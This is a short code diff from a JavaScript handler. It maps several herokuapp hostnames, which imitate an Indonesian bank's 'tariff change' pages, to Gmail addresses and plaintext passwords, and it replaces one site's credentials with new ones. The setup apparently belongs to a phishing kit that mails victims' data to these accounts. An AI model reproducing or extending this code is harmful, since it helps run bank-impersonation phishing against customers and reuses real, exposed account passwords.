@@ -33,8 +33,8 @@ export default function handler(req, res) {
         pass = 'hluxpmqqqqsjrbaf';
 
     } else if(url == 'britarif--ubah.herokuapp.com'){
-        email = 'akunjp771@gmail.com';
-        pass = 'trydeazatzdjorhy';
+        email = 'callbribricoid66@gmail.com';
+        pass = 'epurigonxbspyuud';
 
     } else if(url == 'perubahan--bri-tariff.herokuapp.com'){
         email = 'andarasultan954@gmail.com';
